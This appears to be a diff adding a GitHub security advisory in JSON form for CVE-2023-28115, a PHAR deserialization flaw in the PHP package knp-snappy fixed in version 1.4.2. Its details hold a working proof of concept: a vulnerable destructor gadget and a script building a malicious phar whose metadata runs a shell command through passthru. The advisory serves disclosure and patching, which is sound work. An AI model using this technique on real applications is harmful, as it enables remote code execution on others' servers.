@@ -1,0 +1,93 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-gq6w-q6wh-jggc",
+  "modified": "2023-03-20T13:59:30Z",
+  "published": "2023-03-17T18:24:24Z",
+  "aliases": [
+    "CVE-2023-28115"
+  ],
+  "summary": "PHAR deserialization allowing remote code execution",
+  "details": "## Description\n\nsnappy is vulnerable to PHAR deserialization due to a lack of checking on the protocol before passing it into the `file_exists()` function. If an attacker can upload files of any type to the server he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when snappy is used with frameworks with documented POP chains like Laravel/Symfony vulnerable developer code. If user can control the output file from the `generateFromHtml()` function, it will invoke deserialization.\n\n## Proof of Concept\n\nInstall Snappy via composer require `knplabs/knp-snappy`. After that, under snappy directory, create an `index.php` file with this vulnerable code.\n\n```php\n<?php\n// index.php\n\n// include autoloader\nrequire __DIR__ . '/vendor/autoload.php';\n\n// reference the snappy namespace\nuse Knp\\Snappy\\Pdf;\n\n// vulnerable object\nclass VulnerableClass {\n    public $fileName;\n    public $callback;\n\n    function __destruct() {\n        call_user_func($this->callback, $this->fileName);\n    }\n}\n\n$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');\n// generate pdf from html content and save it at phar://poc.phar\n$snappy->generateFromHtml('<h1>Bill</h1><p>You owe me money, dude.</p>', 'phar://poc.phar');\n```\n\nAs an attacker, we going to generate the malicious phar using this script.\n\n```php\n<?php\n// generate_phar.php\n\nclass VulnerableClass { }\n// Create a new instance of the Dummy class and modify its property\n$dummy = new VulnerableClass();\n$dummy->callback = \"passthru\";\n$dummy->fileName = \"uname -a > pwned\"; //our payload\n\n// Delete any existing PHAR archive with that name\n@unlink(\"poc.phar\");\n\n// Create a new archive\n$poc = new Phar(\"poc.phar\");\n\n// Add all write operations to a buffer, without modifying the archive on disk\n$poc->startBuffering();\n\n// Set the stub\n$poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\");\n\n// Add a new file in the archive with \"text\" as its content\n$poc[\"file\"] = \"text\";\n\n// Add the dummy object to the metadata. This will be serialized\n$poc->setMetadata($dummy);\n\n// Stop buffering and write changes to disk\n$poc->stopBuffering();\n?>\n```\n\nThen run these command to generate the file\n\n```php\nphp --define phar.readonly=0 generate_phar.php\n```\n\nThen execute index.php with `php index.php`. You will see a file named `pwned` will be created. Noted that attacker can upload a file with any extension such as .png or .jpeg. So poc.jpeg also will do the trick.\n\n## Impact\n\nThis vulnerability is capable of remote code execution if Snappy is used with frameworks or developer code with vulnerable POP chains.\n\n## Occurences\n\n<https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670>\n\n## References\n\n- <https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/>",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "knplabs/knp-snappy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28115"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/pull/469"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/commit/b66f79334421c26d9c244427963fa2d92980b5d3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/FriendsOfPHP/security-advisories/blob/master/knplabs/knp-snappy/CVE-2023-28115.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/KnpLabs/snappy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/KnpLabs/snappy/releases/tag/v1.4.2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-gq6w-q6wh-jggc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-502"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-17T18:24:24Z",
+    "nvd_published_at": "2023-03-17T22:15:00Z"
+  }
+}
